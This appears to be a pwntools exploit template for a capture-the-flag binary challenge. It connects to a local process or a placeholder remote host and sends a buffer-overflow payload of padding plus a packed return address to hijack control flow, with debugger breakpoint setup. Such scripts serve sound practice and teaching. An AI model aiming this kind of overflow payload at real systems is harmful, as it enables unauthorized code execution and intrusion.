import sys
from pwn import *

context.terminal = ["xfce4-terminal", "--disable-server", "-e"] 
context.arch = "amd64"

if len(sys.argv) > 1 and sys.argv[1] == "REM":
  p = remote("ip", 1234)
else:
  p = process(["testcases/input", "name"])


# set breakpoints (depending on pie or not)
addr = 0x04006b2
offset = 0x817
#gdb.attach(p, r2cmd="db {}".format(hex(addr)))
gdb.attach(p, rzcmd=".(reldb {})".format(hex(offset)))

# read banner
p.readuntil(b"template\n")

# send payload
payload = b"A"*20 + p64(addr)
p.sendline(payload)

p.interactive()

